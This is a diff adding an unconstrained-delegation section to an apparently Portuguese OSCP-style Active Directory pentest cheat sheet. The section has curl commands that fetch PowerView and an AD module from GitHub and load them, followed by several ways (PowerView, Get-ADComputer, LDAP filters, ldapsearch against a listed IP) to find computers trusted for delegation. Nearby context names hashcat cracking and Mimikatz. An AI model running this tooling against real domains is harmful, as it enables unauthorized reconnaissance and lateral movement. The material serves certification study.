@@ -1239,6 +1239,64 @@ hashcat -m 18200 -a 0 hashes.txt wordlist.txt -o quebradas.txt
 hashcat -m 18200 -a 0 hashes.txt wordlist.txt --show
 hashcat -m 18200 -a 0 hashes.txt wordlist.txt --potfile-disable
 ```
+## UNCONSTRAINED DELEGATION
+##### UNCONSTRAINED DELEGATION - LOAD REQUIREMENTS
+```
+curl https://github.com/n0ts0cial/oscp/raw/main/Microsoft.ActiveDirectory.Management.dll -Outfile Microsoft.ActiveDirectory.Management.dll
+import-module .\Microsoft.ActiveDirectory.Management.dll
+```
+```
+curl https://github.com/n0ts0cial/oscp/raw/main/PowerView.ps1  -Outfile PowerView.ps1
+import-module .\PowerView.ps1
+```
+##### UNCONSTRAINED DELEGATION - FIND SPN
+PROCURE POR CONTAS DE COMPUTADOR COM UNCONSTRAINED DELEGATION
+```
+Get-NetComputer -UnConstrained
+Get-NetComputer -UnConstrained | select samaccountname       
+```
+```
+Get-ADComputer -Filter {TrustedForDelegation -eq $true} -Properties trustedfordelegation,serviceprincipalname,description
+Get-ADComputer -Filter {TrustedForDelegation -eq $true} -Properties trustedfordelegation,serviceprincipalname,description | select samaccountname 
+```
+```
+$LDAPSEARCH = New-Object System.DirectoryServices.DirectorySearcher
+$LDAPSEARCH.Filter = "(&(objectCategory=computer)(objectClass=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))"
+$LDAPSEARCH.FindAll()
+```
+```
+ldapsearch -LLL -x -h 54.189.219.43   -D "vegeta@tech.local" -W -b "DC=tech,DC=local" "(&(objectCategory=computer)(objectClass=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))"
+```
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 # LATERAL MOVEMENT - ACTIVE DIRECTORY
 ## LATERAL MOVEMENT - MIMIKATZ
 ##### LATERAL MOVEMENT MIMIKATZ - LOAD REQUIREMENTS
